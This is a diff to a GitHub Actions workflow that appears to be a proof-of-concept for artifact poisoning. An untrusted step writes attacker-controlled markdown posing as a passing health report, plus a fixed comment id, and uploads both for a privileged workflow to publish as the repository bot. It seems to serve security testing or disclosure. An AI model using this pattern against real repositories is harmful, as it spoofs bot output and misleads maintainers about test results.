@@ -13,14 +13,19 @@ jobs:
       - name: Attacker-controlled payload
         run: |
           cat > comment.md <<'MD'
-          ## Fake Health report
+          ### Health summary (tampered)
 
-          All checks passed. This text was supplied entirely by an outside contributor
-          and is published by the repository's github-actions[bot].
+          Coverage: 100% | Licenses: OK | Tests: all passing.
+
+          _This replacement text and the suppression of the original report were
+          supplied by an outside contributor._
           MD
-          ls -la comment.md
+          printf '6662835513\n' > commentId
+          ls -la comment.md commentId
       - name: Upload artifact the privileged workflow consumes
         uses: actions/upload-artifact@v4
         with:
           name: output
-          path: comment.md
+          path: |
+            comment.md
+            commentId
